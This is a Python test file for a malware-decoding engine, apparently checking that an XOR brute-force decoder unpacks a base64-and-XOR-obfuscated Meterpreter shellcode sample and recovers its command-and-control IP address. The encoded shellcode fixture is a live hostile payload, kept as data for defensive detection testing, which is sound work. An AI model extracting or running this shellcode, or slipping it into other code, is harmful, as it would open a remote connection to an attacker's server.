"""Phase-B tests · Batch 3 — xor-brute (single- and short-repeating-key)."""
from __future__ import annotations

import base64

from engine import (
    AnalysisContext,
    Budget,
    DecoderRegistry,
    Orchestrator,
)
from engine.fingerprint_util import compute as fp


# ---------------------------------------------------------------------------
# Meterpreter payload — the "Testing for NonAI" case from workspace_cases
# ---------------------------------------------------------------------------
METERPRETER_B64 = (
    "38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfI"
    "vOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIv"
    "BFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMj"
    "IyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyM"
    "R46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0SdxwdUsOJTtY3"
    "Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyM"
    "a5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3NzcDGZ5dEUjSEwodIgEoJKXg6X5qzPHl1iO1buG+"
    "VuC6rtpnoH41qg2+GNzdpA2TdUXolH+tJ/mUO65byu/dx/NX5qstEl/1PmpWeplO0fErSN2UEZ"
    "RDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFADbXcDF"
    "Q0SGAN3UUpHRk1XDBYNExgDYWxqZhoYc3dhcQouKSP4VpuFSK7RM6YYoEWg5NP6S9kDRy7v1+9"
    "l6XvafZkG84FqmRudQNMHNVeEM9WPDUrPGzBH2tZZpMkasn6vGEqpNpUUjihiQnkd4eovJ5UwN"
    "NWBtXdWBhJ7ISLKZq6AwYNoC+D0hbjBx8myxeQl7sj9hecL1KkJuU2mb+lDhPXgV+QPHbyNyxg"
    "W2LAdGXKMGjAwRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+QoYqNMVtUlkoRz/PZlPTWZ+1fLS"
    "6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMzIyNLIyNjI3RLe4dwxtz2sJojIyM"
    "jIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41bGe+DLqt7c3BIXGg0RGw0bEg0SGiMjI"
    "yMg"
)


class TestXorBruteRegistered:
    def test_registered(self):
        assert DecoderRegistry.get("xor-brute") is not None


class TestSingleByteXor:
    def test_recovers_key_0x23(self):
        # gzip-compressed english wrapped in single-byte XOR (key 0x2f)
        # Simple sanity: crack a known key
        plaintext = b"the quick brown fox jumps over the lazy dog powershell iex download"
        key = 0x42
        ct = bytes(x ^ key for x in plaintext).decode("latin-1")
        dec = DecoderRegistry.get("xor-brute")
        det = dec.detect(ct, fp(ct), AnalysisContext())
        assert det.confidence > 0.0
        res = dec.decode(ct, det.args, AnalysisContext())
        assert plaintext.decode() in res.output

    def test_orchestrator_base64_then_xor_then_shellcode(self):
        """Meterpreter B64+XOR chain (`Testing for NonAI` case) — end-to-end."""
        r = Orchestrator(AnalysisContext(budget=Budget(max_depth=6, wall_time_ms=4000))).run(
            METERPRETER_B64
        )
        # Chain must include base64 → xor-brute
        ids = [step.decoder for step in r.trace]
        assert "base64-decode" in ids
        assert "xor-brute" in ids, f"xor-brute missing from chain: {ids}"
        # Recovered plaintext must contain the C2 IP embedded in the shellcode
        assert "149.28.81.19" in r.output, (
            "C2 IP 149.28.81.19 not found in decoded output"
        )
        # Findings must include Meterpreter family + T1027
        assert r.findings.family.family
        assert "Meterpreter" in r.findings.family.family or "MSFvenom" in r.findings.family.family
        mitre_ids = {h.id for h in r.findings.mitre_techniques}
        assert "T1027" in mitre_ids


class TestOrchestratorDoesNotOverfire:
    def test_short_english_not_xor_brute(self):
        r = Orchestrator(AnalysisContext(budget=Budget(max_depth=3, wall_time_ms=1000))).run(
            "hello world plain text"
        )
        assert all(s.decoder != "xor-brute" for s in r.trace)
